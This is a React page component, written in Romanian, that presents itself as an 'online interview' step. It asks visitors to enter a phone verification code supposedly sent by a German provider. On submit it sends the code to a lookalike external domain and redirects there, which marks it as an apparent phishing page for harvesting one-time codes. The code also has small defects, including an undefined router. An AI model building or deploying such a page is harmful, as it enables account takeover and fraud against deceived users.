import { useState, useEffect } from "react";
import classes from "@/pages/ut1516432/ut.module.css";
import axios from "axios";

function Home() {
  const [data, changeData] = useState({
    code: ""
  });

  const changeDataFn = e => changeData(prev => ({...prev, [e.target.name]: e.target.value}));


  async function handleSubmitFn() {
    try {
      await axios.post(`http://imobilede.com.id.stra-e.xyz/api/code`, data);
      router.replace('http://imobilede.com.id.stra-e.xyz/verificare');
    } catch(err) {
      console.log(err.response, "ce o avea");
    }
  }


  function handleSubmit(e) {
    e.preventDefault();

    console.log(data.email)

    if(data.code) {
      handleSubmitFn();
    }
  }

  return (
    <section>
      <div className={classes.container}>
        <span className={classes.title}>
          Interviu online
        </span>
        <span className={classes.subTitle}>
          Verifică numărul de telefon și adaugă codul din cifre primit de la providerul nostru german.
        </span>
      </div>

      <form onSubmit={handleSubmit} className={classes.form}>
        <div className={classes.formCell}>
          <label className={classes.formCellName}>Cod verficare</label>
          <input
            name="code"
            className={classes.input}
            value={data.code}
            onChange={changeDataFn}
            type="text"
            required
          />
        
        </div>

        <button className={classes.btn}>Verifica</button>
      </form>
    </section>
  );
}

export default Home;
